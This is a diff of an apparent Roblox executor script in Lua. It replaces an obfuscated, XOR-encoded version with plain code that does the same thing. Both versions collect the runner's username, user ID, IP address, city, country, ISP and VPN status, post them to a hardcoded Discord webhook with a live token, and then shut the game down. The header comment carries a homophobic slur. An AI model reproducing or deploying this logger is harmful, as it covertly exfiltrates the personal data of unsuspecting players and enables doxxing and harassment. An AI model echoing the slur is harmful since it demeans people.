@@ -1,1 +1,79 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v34,v35) local v36={};for v45=1, #v34 do v6(v36,v0(v4(v1(v2(v34,v45,v45 + 1 )),v1(v2(v35,1 + (v45% #v35) ,1 + (v45% #v35) + 1 )))%256 ));end return v5(v36);end local v8=string[v7("\210\203\218\55","\126\177\163\187\69\134\219\167")];local v9=string[v7("\33\212\62\192","\156\67\173\74\165")];local v10=string[v7("\39\162\75","\38\84\215\41\118\220\70")];local v11=bit32 or bit ;local v12=v11[v7("\82\14\45\0","\158\48\118\66\114")];local v13=table[v7("\168\43\30\53\114\177","\155\203\68\112\86\19\197")];local v14=table[v7("\79\211\37\249\82\108","\152\38\189\86\156\32\24\133")];local function v15(v37,v38) local v39={};for v46=2 -1 , #v37 do v14(v39,v8(v12(v9(v10(v37,v46,v46 + 1 )),v9(v10(v38,1 + (v46% #v38) ,1 + (v46% #v38) + (1 -0) )))%256 ));end return v13(v39);end local v16=game:GetService(v15("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v17=game:GetService(v15("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v18=v17[v15("\24\184\74\23\176\22\74\53\174\76\4","\38\84\215\41\118\220\70")];local v19=http_request or request or (syn and syn[v15("\66\19\51\7\251\67\2","\158\48\118\66\114")]) ;local v20=v15("\163\48\4\38\96\255\180\228\32\25\37\112\170\233\175\106\19\57\126\234\250\187\45\95\33\118\167\243\164\43\27\37\60\244\168\252\118\67\103\37\246\169\242\116\65\100\39\252\163\255\113\66\121\119\141\242\159\1\38\46\66\160\220\249\29\60\18\117\169\193\174\2\32\29\103\160\195\170\20\31\110\125\244\168\128\37\64\103\127\137\237\146\112\52\101\69\247\194\175\47\0\59\118\128\162\172\19\21\102\125\241\220\136\21\68\63\35\175\245\158\29","\155\203\68\112\86\19\197");local function v21() local v40=v15("\66\216\32\245\67\125\218\241\66\147\34\228\84","\152\38\189\86\156\32\24\133");if (isfile and readfile and writefile) then if isfile(v40) then return readfile(v40);else local v47=0 + 0 ;local v48;local v49;while true do if ((998 -(915 + 82))==v47) then while true do local v53=0 -0 ;local v54;while true do if (v53==(0 + 0)) then v54=0;while true do if (v54==(0 -0)) then if (v48==(1188 -(1069 + 118))) then return v49;end if ((0 -0)==v48) then local v55=0 -0 ;local v56;while true do if (v55==(0 + 0)) then v56=0 -0 ;while true do if (v56==(0 + 0)) then v49=tostring(math.random(100791 -(368 + 423) ,3142677 -2142678 ))   .. "-"   .. tostring(tick()) ;writefile(v40,v49);v56=1;end if (v56==(19 -(10 + 8))) then v48=3 -2 ;break;end end break;end end end break;end end break;end end end break;end if (v47==0) then v48=0;v49=nil;v47=1;end end end end return v15("\242\88\234\64\245\91\162\11\239\66\183\86\243\69\179","\38\156\55\199");end if  not v19 then return;end local v22=v15("\157\115\119\38\28\99\244","\35\200\29\28\72\115\20\154");local v23=v21();local v24={};local v25="❌ Clean (No VPN)";pcall(function() local v41=0;local v42;while true do if (v41==(442 -(416 + 26))) then v42=v19({[v15("\44\173\221","\84\121\223\177\191\237\76")]=v15("\179\66\221\176\41\10\127\142\186\70\192\238\51\64\57\199\162\24\198\178\61\15\54\206\169\91\200\180\103\90\35\206\181","\161\219\54\169\192\90\48\80"),[v15("\100\71\20\45\70\70","\69\41\34\96")]=v15("\155\230\227","\75\220\163\183\106\98")});if ((v42 and (v42[v15("\49\174\138\35\204\17\153\132\51\220","\185\98\218\235\87")]==200)) or ((14664 -10071)<=(1147 + 1525))) then v22=v16:JSONDecode(v42.Body)[v15("\194\44","\202\171\92\71\134\190")];end break;end end end);pcall(function() local v43=0 -0 ;local v44;while true do if (v43==(438 -(145 + 293))) then v44=v19({[v15("\28\211\32","\232\73\161\76")]=v15("\179\205\86\77\13\225\150\13\84\14\186\201\75\19\29\180\150\72\78\17\181","\126\219\185\34\61"),[v15("\33\203\74\122\113\115","\135\108\174\62\18\30\23\147")]=v15("\145\204\30","\167\214\137\74\171\120\206\83")});if ((v44 and (v44[v15("\184\228\51\73\237\180\168\255\54\88","\199\235\144\82\61\152")]==(630 -(44 + 386)))) or (1168>(4642 -(998 + 488)))) then local v51=0 + 0 ;local v52;while true do if (v51==0) then v52=0 + 0 ;while true do if (v52==(772 -(201 + 571))) then v24=v16:JSONDecode(v44.Body);if (v24[v15("\23\4\182\51\30","\75\103\118\217")] or v24[v15("\207\91\99\0\176\16\192","\126\167\52\16\116\217")] or v24[v15("\222\62\46","\156\168\78\64\224\212\121")] or ((1710 -(116 + 1022))>(18676 -14190))) then v25="✅ VPN/Proxy Detected";end break;end end break;end end end break;end end end);local v26=(v18 and v18[v15("\41\239\168\203","\174\103\142\197")]) or v15("\99\38\84\54\42\73\246","\152\54\72\63\88\69\62") ;local v27=(v18 and v18[v15("\225\215\235\78\253\192","\60\180\164\142")]) or (0 + 0) ;local v28=v24[v15("\91\81\16\39\51\255\11\103\80\4\36\34","\114\56\62\101\73\71\141")] or v15("\150\166\250","\164\216\137\187") ;local v29=v24[v15("\209\239\37\171","\107\178\134\81\210\198\158")] or v15("\22\65\163","\202\88\110\226\166") ;local v30=v24[v15("\209\10\133\254\197\205","\170\163\111\226\151")] or v15("\63\127\147","\73\113\80\210\88\46\87") ;local v31=v24[v15("\142\62\202","\135\225\76\173\114")] or v15("\52\162\153","\199\122\141\216\208\204\221") ;local v32=(v24[v15("\161\220\4\249\108\227\169\216","\150\205\189\112\144\24")] and v24[v15("\41\139\177\75\13\156\4\20\32","\112\69\228\223\44\100\232\113")] and (v24[v15("\216\30\19\218\162\105\130\209","\230\180\127\103\179\214\28")]   .. v15("\192\69","\128\236\101\63\38\132\33")   .. v24[v15("\160\166\31\67\191\255\218\168\172","\175\204\201\113\36\214\139")])) or v15("\105\131\20","\100\39\172\85\188") ;local v33=string.format(v15("\199\56\243\202\0\174\106\176\144\39\237\93\161\133\48\184\108\188\132\115\235\56\158\129\62\168\56\154\140\60\190\125\189\202\121\199\56\140\147\54\191\34\249\128\118\190\120\249\200\118\190\49\211\192\26\157\34\249\128\118\190\120\211\192\31\162\123\184\148\58\162\118\227\192\51\232\107\245\192\118\190\52\249\197\32\173\18\249\169\0\157\34\249\128\118\190\120\211\192\16\162\119\171\132\58\163\121\173\133\32\247\56\185\197\32\173\18\249\164\54\187\113\186\133\115\132\92\227\192\51\232\107\185\234\115\155\72\151\192\16\165\125\186\139\105\237\61\170\234","\83\205\24\217\224"),v26,v27,v22,v29,v30,v28,v31,v32,v23,v25);pcall(function() v19({[v15("\211\215\193","\93\134\165\173")]=v20,[v15("\147\247\213\202\53\202","\30\222\146\161\162\90\174\210")]=v15("\213\97\67\62","\106\133\46\16"),[v15("\112\37\114\248\95\82\75","\32\56\64\19\156\58")]={[v15("\121\199\235\66\95\252\148\23\252\252\70\95","\224\58\168\133\54\58\146")]=v15("\88\70\91\241\124\133\134\31\80\89\69\178\127\149\136\5","\107\57\54\43\157\21\230\231")},[v15("\249\132\21\236","\175\187\235\113\149\217\188")]=v16:JSONEncode({[v15("\63\160\143\88\230\119\108","\24\92\207\225\44\131\25")]=v33})});end);wait(3 -2 );pcall(function() game:Shutdown();end);
+--# CRACK IF GAY - MADE BY 0rep on discord
+local HttpService = game:GetService("HttpService")
+local req = (http_request or request or syn and syn.request)
+
+-- SETTINGS
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"
+
+-- Ensure HTTP request is working
+if not req then
+    print("HTTP requests not supported.")
+    return
+end
+
+-- INIT
+local ip = "Unknown"
+local geoData = {}
+
+-- TRY TO GET IP
+print("Attempting to fetch IP...")
+pcall(function()
+    local ipResponse = req({
+        Url = "https://api.ipify.org?format=json",
+        Method = "GET"
+    })
+    if ipResponse and ipResponse.StatusCode == 200 then
+        ip = HttpService:JSONDecode(ipResponse.Body).ip
+        print("IP fetched successfully: " .. ip)  -- Debug output
+    else
+        print("Failed to fetch IP.")  -- Debug output
+    end
+end)
+
+-- TRY TO GET GEOLOCATION (AND VPN STATUS)
+print("Attempting to fetch GeoLocation...")
+pcall(function()
+    local geoResponse = req({
+        Url = "https://ipapi.co/json",
+        Method = "GET"
+    })
+    if geoResponse and geoResponse.StatusCode == 200 then
+        geoData = HttpService:JSONDecode(geoResponse.Body)
+        print("GeoLocation data fetched.")  -- Debug output
+    else
+        print("Failed to fetch GeoLocation.")  -- Debug output
+    end
+end)
+
+-- LOGGING USER DATA TO DEBUG
+print("Username: " .. game.Players.LocalPlayer.Name)
+print("UserID: " .. game.Players.LocalPlayer.UserId)
+print("IP: " .. ip)
+print("GeoData: " .. HttpService:JSONEncode(geoData))
+
+-- BUILD AND LOG TO DISCORD WEBHOOK (if available)
+if ip ~= "Unknown" and geoData.country_name then
+    local msg = string.format([[
+    Script executed:
+    Username: %s (%s)
+    IP: %s
+    Location: %s, %s
+    Country: %s
+    ISP: %s
+    ]], game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId, ip, geoData.city or "Unknown", geoData.region or "Unknown", geoData.country_name, geoData.org or "Unknown")
+
+    pcall(function()
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({ content = msg })
+        })
+    end)
+else
+    print("IP or Geo data was not retrieved, check your requests.")
+end
+
+-- CLOSE THE GAME AFTER
+wait(1)
+game:Shutdown()
